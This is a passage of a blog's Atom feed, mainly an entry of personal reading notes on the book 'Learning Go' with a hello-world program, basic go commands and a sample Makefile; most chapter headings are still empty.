    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Hacking" scheme="http://example.com/tags/Hacking/"/>
    
    <category term="Hack" scheme="http://example.com/tags/Hack/"/>
    
    <category term="Penetration" scheme="http://example.com/tags/Penetration/"/>
    
    <category term="PrivilegeEscalation" scheme="http://example.com/tags/PrivilegeEscalation/"/>
    
    <category term="Security" scheme="http://example.com/tags/Security/"/>
    
    <category term="CyberSecurity" scheme="http://example.com/tags/CyberSecurity/"/>
    
    <category term="ATT&amp;CK" scheme="http://example.com/tags/ATT-CK/"/>
    
    <category term="Pentesting" scheme="http://example.com/tags/Pentesting/"/>
    
    <category term="ActiveDirectory" scheme="http://example.com/tags/ActiveDirectory/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Learning Go</title>
    <link href="http://example.com/2026/01/05/2026-1-5-LearningGo/"/>
    <id>http://example.com/2026/01/05/2026-1-5-LearningGo/</id>
    <published>2026-01-04T16:10:20.000Z</published>
    <updated>2026-01-22T17:10:31.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/LearningGo/libro.jpg'><img src="/images/books/LearningGo/libro.jpg"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Learning Go”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Chapter-1-Setting-Up-Your-Go-Environment"><a href="#Chapter-1-Setting-Up-Your-Go-Environment" class="headerlink" title="Chapter.1 - Setting Up Your Go Environment"></a>Chapter.1 - Setting Up Your Go Environment</h1><h2 id="The-go-command"><a href="#The-go-command" class="headerlink" title="The go command"></a>The <code>go</code> command</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import &quot;fmt&quot;<br><br>func main() &#123;<br>    fmt.Println(&quot;Hello, world!&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; go run hello.go<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; go build hello.go<br></code></pre></td></tr></table></figure><p>This creates an executable called <strong>hello</strong> (or <strong>hello.exe</strong> on Windows) in the current directory.</p><h2 id="Makefiles"><a href="#Makefiles" class="headerlink" title="Makefiles"></a>Makefiles</h2><p>Here’s a sample Makefile to add to our very simple project:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.DEFAULT_GOAL := build<br><br>fmt:<br>    go fmt ./...<br>.PHONY:fmt<br><br>lint: fmt<br>    golint ./...<br>.PHONY: lint<br><br>vet: fmt<br>    go vet ./...<br>.PHONY:vet<br><br>build: vet<br>go build hello.go<br>.PHONY:build<br></code></pre></td></tr></table></figure><br>Each possible operation is called a <strong>target</strong>. The <code>.DEFAULT_GOAL</code> defines which target is run when no target is specified. In our case, we are going to run the build target.</p><p>The world before the colon (:) is the name of the target. Any words after the target (like <code>vet</code> in the line <code>build: vet</code>) are the other targets that must be run before the specified target runs. The taks that are performed by the target are on the indented lines after the target (The)</p><p>Once theMakefile is in your directory, type:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; make<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-2-Primative-Types-and-Declarations"><a href="#Chapter-2-Primative-Types-and-Declarations" class="headerlink" title="Chapter.2 - Primative Types and Declarations"></a>Chapter.2 - Primative Types and Declarations</h1><h1 id="Chapter-3-Composite-Types"><a href="#Chapter-3-Composite-Types" class="headerlink" title="Chapter.3 - Composite Types"></a>Chapter.3 - Composite Types</h1><h1 id="Chapter-4-Blocks-Shadows-and-Control-Structures"><a href="#Chapter-4-Blocks-Shadows-and-Control-Structures" class="headerlink" title="Chapter.4 - Blocks, Shadows, and Control Structures"></a>Chapter.4 - Blocks, Shadows, and Control Structures</h1><h1 id="Chapter-5-Functions"><a href="#Chapter-5-Functions" class="headerlink" title="Chapter.5 - Functions"></a>Chapter.5 - Functions</h1><h1 id="Chapter-6-Pointers"><a href="#Chapter-6-Pointers" class="headerlink" title="Chapter.6 - Pointers"></a>Chapter.6 - Pointers</h1><h1 id="Chapter-7-Types-Methods-and-Interfaces"><a href="#Chapter-7-Types-Methods-and-Interfaces" class="headerlink" title="Chapter.7 - Types, Methods, and Interfaces"></a>Chapter.7 - Types, Methods, and Interfaces</h1><h1 id="Chapter-8-Errors"><a href="#Chapter-8-Errors" class="headerlink" title="Chapter.8 - Errors"></a>Chapter.8 - Errors</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="Go-Lang" scheme="http://example.com/tags/Go-Lang/"/>
    
    <category term="Go" scheme="http://example.com/tags/Go/"/>
    
  </entry>
  
</feed>
